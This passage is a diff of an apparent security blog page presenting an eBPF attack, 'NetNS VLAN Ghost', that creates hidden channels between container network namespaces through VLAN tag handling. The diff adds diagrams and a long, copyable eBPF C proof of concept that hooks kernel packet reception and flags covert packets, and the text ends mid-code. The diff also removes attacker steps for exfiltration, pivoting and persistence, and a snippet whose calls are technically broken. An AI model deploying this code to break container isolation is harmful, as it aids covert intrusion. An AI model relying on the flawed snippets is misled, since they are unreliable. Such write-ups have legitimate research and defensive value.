@@ -156,243 +156,6 @@
                     
                     
                 
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
             </div>
         </nav>
 
@@ -415,58 +178,32 @@
 
 <p>A technique using eBPF to create hidden communication channels between isolated network namespaces by manipulating VLAN tag handling. This attack bypasses network namespace isolation by intercepting and modifying network packets at the driver level, allowing containers and processes to communicate across security boundaries without detection by standard monitoring tools.</p>
 
-<pre><code class="language-mermaid">graph TD
+<pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
+graph TD
     A[Container A] --&gt;|1. Send Packet| B[Network Stack]
     B --&gt;|2. Process Packet| C[Network Driver]
     D[eBPF Program] --&gt;|3. Hook &amp; Intercept| C
     C --&gt;|4. Modify VLAN Tags| E[Hidden Channel]
     E --&gt;|5. Cross Namespace| F[Container B]
     G[Network Monitor] --&gt;|6. Sees Nothing| H[False Security]
+    
+    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
+    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
+    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
+    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
+    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
+    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
+    style G fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
+    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
+    
+    click B "https://www.kernel.org/doc/html/latest/networking/index.html" "Network Documentation"
+    click C "https://www.kernel.org/doc/html/latest/networking/netdev-features.html" "Network Driver Features"
+    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
 </code></pre>
 
 <p><strong>Why</strong></p>
 
 <p>Because eBPF + misconfiguration =&gt; broken isolation. Network namespaces are a fundamental isolation mechanism in container environments, preventing unauthorized communication between containers. By using eBPF to manipulate VLAN tags and packet handling at the driver level, attackers can create covert channels that bypass these isolation mechanisms while remaining invisible to standard monitoring tools.</p>
-
-<p><strong>POC</strong></p>
-
-<p><em>Coming soon.</em></p>
-
-<p>The proof of concept will demonstrate:</p>
-<ul>
-  <li>Hooking into network driver packet processing functions</li>
-  <li>Creating covert channels between isolated network namespaces</li>
-  <li>Bypassing container network policies and firewalls</li>
-  <li>Maintaining stealth by manipulating VLAN tags</li>
-  <li>Establishing bidirectional communication across security boundaries</li>
-</ul>
-
-<p><strong>Attacker hat on</strong></p>
-
-<ol>
-  <li>Identify a target system with eBPF capabilities and network namespaces</li>
-  <li>Map the kernel functions responsible for network packet processing</li>
-  <li>Develop eBPF programs that hook into VLAN tag handling</li>
-  <li>Load the malicious BPF programs with appropriate privileges</li>
-  <li>Establish covert communication channels between isolated containers</li>
-  <li>Exfiltrate data or pivot between containers using the hidden channel</li>
-  <li>Maintain persistence through the eBPF programs</li>
-</ol>
-
-<p><strong>Defender hat on</strong></p>
-
-<ol>
-  <li>Remove CAP_BPF from untrusted processes and containers</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Monitor for unexpected eBPF programs attached to network functions</li>
-  <li>Use network monitoring at multiple levels, including physical interfaces</li>
-  <li>Implement egress filtering and anomaly detection</li>
-  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
-</ol>
-
-<p><strong>Conclusion</strong></p>
-
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to manipulate network packet processing through eBPF creates a dangerous scenario where container isolation can be completely bypassed while appearing intact. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in multi-tenant environments.</p>
 
 <h2 id="technical-details">Technical Details</h2>
 
@@ -482,6 +219,116 @@
 
 <p>VLAN (Virtual LAN) tagging is used to segment network traffic on shared physical interfaces, with the kernel handling the addition and removal of VLAN tags.</p>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      Host System                            │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Container A   │      │ Container B   │                   │
+│  │ Network NS 1  │      │ Network NS 2  │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼───────┐      ┌───────▼───────┐                   │
+│  │ Virtual       │      │ Virtual       │                   │
+│  │ Interface A   │      │ Interface B   │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼──────────────────────▼───────┐                   │
+│  │           Virtual Bridge              │                   │
+│  └──────────────────┬───────────────────┘                   │
+│                     │                                       │
+│  ┌──────────────────▼───────────────────┐                   │
+│  │           Physical Interface         │                   │
+│  └────────────────────────────────────────────────────────┘ │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>When eBPF is used to manipulate network packet processing, the architecture is subverted:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      Host System                            │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Container A   │      │ Container B   │                   │
+│  │ Network NS 1  │      │ Network NS 2  │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼───────┐      ┌───────▼───────┐                   │
+│  │ Virtual       │      │ Virtual       │                   │
+│  │ Interface A   │      │ Interface B   │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼──────────────────────▼───────┐                   │
+│  │           Virtual Bridge              │                   │
+│  └──────────────────┬───────────────────┘                   │
+│                     │                                       │
+│  ┌───────────────┐  │                                       │
+│  │ eBPF Program  │◀─┘                                       │
+│  │               │─┐                                        │
+│  └───────────────┘ │                                        │
+│                    │                                        │
+│  ┌──────────────────▼───────────────────┐                   │
+│  │           Physical Interface         │                   │
+│  └────────────────────────────────────────────────────────┘ │
+│                     │                                       │
+│                     ▼                                       │
+│  ┌─────────────────────────────────────┐                    │
+│  │     Covert Channel (Hidden)         │                    │
+│  └─────────────────────────────────────┘                    │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
+
 <h3 id="exploitation-technique">Exploitation Technique</h3>
 
 <p>The exploit leverages eBPF’s ability to attach to kernel functions that process network packets. By intercepting these calls, an attacker can:</p>
@@ -494,7 +341,7 @@
   <li><strong>Evade detection</strong>: Ensure monitoring tools see only expected traffic patterns</li>
 </ol>
 
-<h3 id="code-snippet">Code Snippet</h3>
+<h3 id="comprehensive-poc">Comprehensive POC</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -533,7 +380,326 @@
 35
 36
 37
-</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to create cross-namespace channels</span>
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// NetNS VLAN Ghost - eBPF exploitation proof of concept</span>
+<span class="c1">// This demonstrates creating covert channels between network namespaces</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf_helpers.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/if_ether.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/ip.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/tcp.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/udp.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/if_vlan.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/pkt_cls.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+
+<span class="c1">// Configuration</span>
+<span class="cp">#define MAX_NAMESPACES 16
+#define MAX_COMM_LEN 16
+#define COVERT_VLAN_ID 4242  // VLAN ID used for covert channel
+#define COVERT_PROTO 0x8942  // Custom ethertype for covert channel
+</span>
+<span class="c1">// Structure to track packet events</span>
+<span class="k">struct</span> <span class="n">packet_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>                <span class="c1">// Process ID</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">];</span>  <span class="c1">// Command name</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>          <span class="c1">// Event timestamp</span>
+    <span class="n">u32</span> <span class="n">src_ns</span><span class="p">;</span>             <span class="c1">// Source network namespace</span>
+    <span class="n">u32</span> <span class="n">dst_ns</span><span class="p">;</span>             <span class="c1">// Destination network namespace</span>
+    <span class="n">u32</span> <span class="n">src_ip</span><span class="p">;</span>             <span class="c1">// Source IP</span>
+    <span class="n">u32</span> <span class="n">dst_ip</span><span class="p">;</span>             <span class="c1">// Destination IP</span>
+    <span class="n">u16</span> <span class="n">src_port</span><span class="p">;</span>           <span class="c1">// Source port</span>
+    <span class="n">u16</span> <span class="n">dst_port</span><span class="p">;</span>           <span class="c1">// Destination port</span>
+    <span class="n">u16</span> <span class="n">vlan_id</span><span class="p">;</span>            <span class="c1">// VLAN ID</span>
+    <span class="n">u16</span> <span class="n">protocol</span><span class="p">;</span>           <span class="c1">// Protocol</span>
+    <span class="n">u32</span> <span class="n">action</span><span class="p">;</span>             <span class="c1">// 1 = redirect, 2 = modify, 3 = drop</span>
+<span class="p">};</span>
+
+<span class="c1">// Map to store network namespace information</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>  <span class="c1">// Namespace ID as key</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span> <span class="c1">// Target namespace ID</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="n">MAX_NAMESPACES</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">namespace_map</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to store covert channel configuration</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">covert_config</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Perf event output for logging</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_PERF_EVENT_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Helper function to check if a namespace is in our target list</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_target_namespace</span><span class="p">(</span><span class="n">u32</span> <span class="n">ns_id</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">namespace_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ns_id</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">target</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to get the destination namespace for a source namespace</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">u32</span> <span class="nf">get_destination_namespace</span><span class="p">(</span><span class="n">u32</span> <span class="n">src_ns</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">dst_ns</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">namespace_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src_ns</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dst_ns</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">*</span><span class="n">dst_ns</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to check if a packet is part of our covert channel</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_covert_packet</span><span class="p">(</span><span class="k">struct</span> <span class="n">ethhdr</span> <span class="o">*</span><span class="n">eth</span><span class="p">,</span> <span class="n">u16</span> <span class="n">vlan_id</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Check for our custom ethertype or VLAN ID</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">eth</span><span class="o">-&gt;</span><span class="n">h_proto</span> <span class="o">==</span> <span class="n">bpf_htons</span><span class="p">(</span><span class="n">COVERT_PROTO</span><span class="p">))</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">vlan_id</span> <span class="o">==</span> <span class="n">COVERT_VLAN_ID</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    
+    <span class="c1">// Check if covert channel is enabled</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">enabled</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">covert_config</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">enabled</span> <span class="o">||</span> <span class="o">*</span><span class="n">enabled</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    
+    <span class="c1">// Additional checks could be implemented here</span>
+    <span class="c1">// For example, specific source/destination IP patterns</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to extract VLAN ID from a packet</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">u16</span> <span class="nf">extract_vlan_id</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Check if this is a VLAN tagged packet</span>
+    <span class="n">u16</span> <span class="n">vlan_tci</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vlan_tci</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">vlan_tci</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">vlan_tci</span><span class="p">);</span>
+    
+    <span class="c1">// Extract VLAN ID from TCI</span>
+    <span class="k">return</span> <span class="n">vlan_tci</span> <span class="o">&amp;</span> <span class="n">VLAN_VID_MASK</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the network packet receive function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/__netif_receive_skb_core"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_receive_skb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
 <span class="p">{</span>
@@ -541,49 +707,660 @@
     <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span><span class="p">;</span>
     <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">net</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">net</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">nd_net</span><span class="p">);</span>
     
-    <span class="c1">// Check if this is from our target namespace</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_namespace</span><span class="p">(</span><span class="n">net</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Extract packet information</span>
-        <span class="k">struct</span> <span class="n">ethhdr</span> <span class="n">eth</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eth</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
-        
-        <span class="c1">// Check if this is our covert channel packet</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">is_covert_packet</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eth</span><span class="p">))</span> <span class="p">{</span>
-            <span class="c1">// Modify the packet's network namespace</span>
-            <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">dest_net</span> <span class="o">=</span> <span class="n">get_destination_namespace</span><span class="p">();</span>
-            <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">nd_net</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dest_net</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dest_net</span><span class="p">));</span>
+    <span class="c1">// Get namespace ID</span>
+    <span class="n">u32</span> <span class="n">ns_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ns_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ns_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">net</span><span class="o">-&gt;</span><span class="n">ns</span><span class="p">.</span><span class="n">inum</span><span class="p">);</span>
+    
+    <span class="c1">// Extract packet headers</span>
+    <span class="k">struct</span> <span class="n">ethhdr</span> <span class="n">eth</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eth</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    
+    <span class="c1">// Extract VLAN ID</span>
+    <span class="n">u16</span> <span class="n">vlan_id</span> <span class="o">=</span> <span class="n">extract_vlan_id</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
+    
+    <span class="c1">// Check if this is a covert channel packet</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_covert_packet</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eth</span><span class="p">,</span> <span class="n">vlan_id</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Get destination namespace</span>
+        <span class="n">u32</span> <span class="n">dst_ns</span> <span class="o">=</span> <span class="n">get_destination_namespace</span><span class="p">(</span><span class="n">ns_id</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">dst_ns</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// In a real exploit, we would now:</span>
+            <span class="c1">// 1. Modify the packet's network namespace</span>
+            <span class="c1">// 2. Adjust VLAN tags as needed</span>
+            <span class="c1">// 3. Ensure the packet is delivered to the target namespace</span>
             
-            <span class="c1">// Modify or strip VLAN tags as needed</span>
-            <span class="n">modify_vlan_tags</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
+            <span class="c1">// For demonstration, we'll just log the event</span>
+            <span class="k">struct</span> <span class="n">packet_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+            <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">src_ns</span> <span class="o">=</span> <span class="n">ns_id</span><span class="p">;</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">dst_ns</span> <span class="o">=</span> <span class="n">dst_ns</span><span class="p">;</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">vlan_id</span> <span class="o">=</span> <span class="n">vlan_id</span><span class="p">;</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">eth</span><span class="p">.</span><span class="n">h_proto</span><span class="p">);</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">action</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">// redirect</span>
+            
+            <span class="c1">// Extract IP header if this is an IP packet</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">eth</span><span class="p">.</span><span class="n">h_proto</span> <span class="o">==</span> <span class="n">bpf_htons</span><span class="p">(</span><span class="n">ETH_P_IP</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">struct</span> <span class="n">iphdr</span> <span class="n">iph</span><span class="p">;</span>
+                <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">));</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">src_ip</span> <span class="o">=</span> <span class="n">iph</span><span class="p">.</span><span class="n">saddr</span><span class="p">;</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">dst_ip</span> <span class="o">=</span> <span class="n">iph</span><span class="p">.</span><span class="n">daddr</span><span class="p">;</span>
+                
+                <span class="c1">// Extract port information for TCP/UDP</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">iph</span><span class="p">.</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcph</span><span class="p">;</span>
+                    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tcph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">tcph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">));</span>
+                    <span class="n">event</span><span class="p">.</span><span class="n">src_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">tcph</span><span class="p">.</span><span class="n">source</span><span class="p">);</span>
+                    <span class="n">event</span><span class="p">.</span><span class="n">dst_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">tcph</span><span class="p">.</span><span class="n">dest</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iph</span><span class="p">.</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_UDP</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">struct</span> <span class="n">udphdr</span> <span class="n">udph</span><span class="p">;</span>
